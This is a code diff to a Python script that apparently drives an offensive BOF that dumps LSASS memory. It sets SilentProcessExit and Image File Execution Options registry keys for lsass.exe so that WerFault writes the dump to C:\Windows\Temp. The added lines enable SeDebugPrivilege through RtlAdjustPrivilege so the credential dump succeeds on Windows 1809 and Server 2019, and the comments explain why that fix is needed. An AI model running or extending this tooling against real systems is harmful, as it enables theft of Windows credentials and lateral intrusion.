@@ -31,6 +31,31 @@ DUMP_DIR = r"C:\Windows\Temp"
 IFEO_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe"
 SILENT_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe"
 
+SE_DEBUG_PRIVILEGE = 20
+
+
+def enable_debug_privilege():
+    """
+    Enable SeDebugPrivilege at the Python process level BEFORE the BOF runs.
+    On Windows 1809/Server 2019, the privilege must be active before
+    RtlReportSilentProcessExit is called, otherwise WerFault produces
+    an empty dump or no dump at all. On 21H2+ it often works without
+    this because the privilege propagation timing is different.
+    """
+    import ctypes
+    ntdll = ctypes.windll.ntdll
+    ntdll.RtlAdjustPrivilege.restype = ctypes.c_long
+    ntdll.RtlAdjustPrivilege.argtypes = [
+        ctypes.c_ulong, ctypes.c_bool, ctypes.c_bool, ctypes.POINTER(ctypes.c_bool)
+    ]
+    was_enabled = ctypes.c_bool(False)
+    status = ntdll.RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, True, False, ctypes.byref(was_enabled))
+    if status != 0:
+        print(f"[!] Failed to enable SeDebugPrivilege: 0x{status & 0xFFFFFFFF:08X}")
+        print("[!] Make sure you are running as Administrator.")
+        sys.exit(1)
+    print("[+] SeDebugPrivilege enabled (process level)")
+
 
 def setup_registry():
     """Set (or re-set) the Silent Process Exit registry keys."""
@@ -107,6 +132,10 @@ def main():
     print(f"[*] Entry point: go")
     print(f"[*] Platform   : {platform.system()} {platform.machine()}")
     print()
+
+    # Enable SeDebugPrivilege at process level BEFORE anything else.
+    # This fixes empty/missing dumps on Windows 1809 and Server 2019.
+    enable_debug_privilege()
 
     # Pre-set registry keys so they exist before the BOF runs
     print("[*] Setting up Silent Process Exit registry keys...")
